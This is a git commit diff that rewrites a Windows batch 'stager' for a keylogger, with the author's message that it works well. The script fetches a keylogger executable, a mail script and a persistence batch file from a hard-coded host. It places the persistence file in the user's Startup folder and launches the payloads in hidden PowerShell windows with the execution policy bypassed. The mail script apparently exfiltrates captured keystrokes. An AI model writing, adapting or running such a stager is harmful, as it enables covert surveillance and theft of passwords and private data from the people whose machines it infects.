2aefd0a7f5da3220c8a81f08e4b76f5f60d0efbd
Lupin <99235929+jitenadk@users.noreply.github.com>
2024-02-12 16:52:46 +0545

    stager is working damn good

--- stager.bat
+++ stager.bat
@@ -1,29 +1,20 @@
-REM Change to the temp directory
-REM cd "%userprofile%\AppData\Local\Temp"
+@echo off
+setlocal
 
-cd "D:\keylogger\Key_logger_v_1.2\hosting_test"
+set "URL=http://192.168.101.2:80"
 
-REM Replace the URL below with the actual URL of the keylogger on your server
-set URL= http://192.168.48.1:80
+set "fileTemp=%env:TEMP%"
+set "fileStartup=C:\Users\Acer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
-REM Download three files
-start powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%/logger.exe','logger.exe')"
-start powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%/Record.txt','Record.txt')"
-start powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%/ps_mail.ps1','ps_mail.ps1')"
+start powershell -Command "Invoke-Webrequest -Uri %URL%/key_logger.exe -OutFile $env:TEMP\logger.exe"
+start powershell -Command "Invoke-Webrequest -Uri %URL%/ps_mail.ps1 -OutFile $env:TEMP\ps_mail.ps1"
+start powershell -Command "Invoke-Webrequest -Uri %URL%/Record.txt -OutFile $env:TEMP\Record.txt"
+start powershell -Command "Invoke-Webrequest -Uri %URL%/persistent.bat -OutFile '%fileStartup%\persistent.bat'"
 
-timeout /t 2 /nobreak
+timeout /t 1 /nobreak
 
-REM start /MIN logger.exe
-REM Start powershell -Command "(./ps_mail.ps1)"
+start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\logger.exe"
 
-start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(./logger.exe)"
+start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\ps_mail.ps1"
 
-start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(./ps_mail.ps1)"
-
-REM Change to the startup directory
-REM cd "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
-
-cd "D:\keylogger\Key_logger_v_1.2\hosting_test"
-
-REM Download a batch file
-start powershell -Command (New-Object System.Net.WebClient).DownloadFile('%URL%/persistent.bat', 'persistent.bat')
+endlocal
